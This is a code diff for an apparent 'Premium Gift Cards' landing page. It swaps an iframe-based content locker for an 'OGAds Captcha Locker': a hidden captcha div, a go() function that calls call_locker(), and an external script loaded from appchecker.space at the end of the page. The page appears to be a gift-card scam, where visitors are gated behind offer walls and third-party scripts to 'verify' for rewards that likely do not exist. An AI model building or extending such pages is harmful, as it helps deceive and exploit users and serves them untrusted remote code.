@@ -52,7 +52,7 @@ z-index:-3;
 #tutorialGif {
     width: 100%;
     height: 100%;
-    object-fit: cover; /* Bach i-ghatti l-ecran kamla bhal f TikTok */
+    object-fit: cover;
     pointer-events: none;
 }
 
@@ -247,45 +247,6 @@ margin-top:16px;
 background:#1f2937;
 }
 
-#lockerModal{
-position:fixed;
-inset:0;
-background:rgba(0,0,0,.95);
-display:none;
-justify-content:center;
-align-items:center;
-z-index:9999;
-}
-
-.lockerBox{
-width:90%;
-height:85%;
-max-width:500px;
-background:#111;
-border-radius:16px;
-overflow:hidden;
-position:relative;
-}
-
-.lockerBox iframe{
-width:100%;
-height:100%;
-border:none;
-}
-
-.closeBtn{
-position:absolute;
-top:10px;
-right:10px;
-background:red;
-color:#fff;
-border:none;
-padding:8px 12px;
-border-radius:8px;
-cursor:pointer;
-font-weight:bold;
-}
-
 .footer{text-align:center;padding:26px;font-size:12px;opacity:.45}
 
 @media(max-width:480px){
@@ -298,6 +259,8 @@ font-weight:bold;
 </head>
 
 <body>
+
+<div style="display:none;"><div data-captcha-enable="true"></div></div>
 
 <div id="ttOverlay">
     <img src="tutorial.gif" id="tutorialGif" alt="Loading Tutorial...">
@@ -381,7 +344,6 @@ font-weight:bold;
 </div>
 </div>
 
-<div id="lockerModal"><div class="lockerBox"><iframe id="lockerFrame"></iframe><button class="closeBtn" onclick="closeLocker()">✕</button></div></div>
 <div class="footer">© 2026 Premium Gift Cards</div>
 
 <script>
@@ -496,8 +458,15 @@ function openOffer(title,el){
     },900);
 }
 
-function go(){ document.getElementById("lockerModal").style.display="flex"; document.getElementById("lockerFrame").src="https://checkmyapp.space/cl/i/7jvwjk"; }
-function closeLocker(){ document.getElementById("lockerModal").style.display="none"; document.getElementById("lockerFrame").src=""; }
+// Function to trigger OGAds Captcha Locker
+function go(){ 
+    if (typeof call_locker === 'function') {
+        call_locker(); 
+    } else {
+        alert("Verification is loading... please try again in a second.");
+    }
+}
+
 function backPage(){ document.getElementById("offerPage").style.display="none"; document.getElementById("grid").style.display="grid"; document.getElementById("chatArea").style.display="block"; }
 
 window.addEventListener("load",()=>{
@@ -510,5 +479,8 @@ window.addEventListener("load",()=>{
     }
 });
 </script>
+
+<script type="text/javascript" src="https://appchecker.space/cp/js/1qz46"></script>
+
 </body>
 </html>
